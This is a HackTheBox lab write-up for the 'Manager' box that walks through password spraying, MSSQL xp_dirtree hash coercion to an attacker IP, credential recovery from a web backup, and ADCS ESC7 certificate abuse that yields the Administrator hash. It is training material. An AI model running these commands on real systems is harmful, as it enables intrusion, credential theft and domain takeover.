# Manager — HackTheBox (write-up)

**Difficulty:** Medium
**Box:** Manager (HackTheBox)
**Author:** dsec
**Date:** 2025-04-13

---

## TL;DR

### RID brute-force enumerated users. Username-as-password spray found `Operator:operator` for MSSQL. xp_dirtree listed web backup containing `raven`'s creds. ADCS ESC7 (ManageCA rights) abused to issue a certificate as Administrator via SubCA template for pass-the-hash.
---
## Target info

- Host: `10.129.42.194`
- Domain: `manager.htb` / `dc01.manager.htb`
- Services discovered: `53`, `80`, `88`, `135`, `139`, `389`, `445`, `1433`, `3268`, `5985` and more
---
## Enumeration

```bash
nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,49667,49693,49694,49732,54499,59175,61113 -sCV 10.129.42.194 -vvv
```

![Nmap results 1](images/manager-htb_1.png)
![Nmap results 2](images/manager-htb_2.png)
![Nmap results 3](images/manager-htb_3.png)
![Nmap results 4](images/manager-htb_4.png)
![Nmap results 5](images/manager-htb_5.png)
![Nmap results 6](images/manager-htb_6.png)

```bash
enum4linux -a -u "guest" -p "" 10.129.42.194
```

![enum4linux results](images/manager-htb_7.png)

RID brute-force to enumerate users:

```bash
lookupsid.py manager.htb/anonymous@10.129.42.194 -no-pass
```

![lookupsid results](images/manager-htb_8.png)

Password spray with username-as-password:

```bash
nxc smb 10.129.42.194 -u users.txt -p users_lowercase.txt --no-bruteforce --continue-on-success
```

![Password spray](images/manager-htb_9.png)

Found `Operator:operator` -- auths for SMB, LDAP, and MSSQL (not WinRM).

---
## Foothold

Connected to MSSQL:

```bash
mssqlclient.py -windows-auth manager.htb/Operator:'operator'@10.129.42.194
```

Tried to coerce a hash with xp_dirtree but couldn't crack it:

```sql
EXEC xp_dirtree '\\10.10.14.30\test', 1, 1
```

![Hash capture](images/manager-htb_10.png)

Used xp_dirtree to enumerate the web root instead:

```sql
xp_dirtree C:\inetpub\wwwroot
```

![Web root listing](images/manager-htb_11.png)

Downloaded the backup:

```bash
wget http://manager.htb/website-backup-27-07-23-old.zip
unzip website-backup-27-07-23-old.zip -d webbackup/
```

![Backup contents](images/manager-htb_12.png)

Found creds: `raven:R4v3nBe5tD3veloP3r!123`

```bash
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

![WinRM shell](images/manager-htb_13.png)

---
## Privesc

Ran certipy to find ADCS vulnerabilities:

```bash
certipy find -dc-ip 10.129.42.194 -ns 10.129.42.194 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```

![Certipy ESC7](images/manager-htb_14.png)

ESC7 -- Raven has ManageCA rights on `manager-DC01-CA`.

Added Raven as an officer:

```bash
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

![Add officer](images/manager-htb_15.png)

Verified the change:

![Officer confirmed](images/manager-htb_16.png)

Requested a SubCA certificate as Administrator (intentionally fails but saves the private key):

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

![SubCA request](images/manager-htb_17.png)

Issued the failed request:

```bash
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

![Issue request](images/manager-htb_18.png)

Retrieved the certificate:

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

![Retrieve cert](images/manager-htb_19.png)

Authenticated with the certificate:

```bash
certipy auth -pfx administrator.pfx -dc-ip manager.htb
```

![Administrator hash](images/manager-htb_20.png)

Got Administrator NTLM hash: `aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef`

---
## Lessons & takeaways

- Username-as-password sprays are surprisingly effective in AD environments
- xp_dirtree in MSSQL can list file system contents even when you can't execute commands
- Web backups left in the web root are a common source of credential leaks
- ADCS ESC7 (ManageCA) allows issuing certificates through the SubCA template -- officer groups reset periodically so speed matters
---
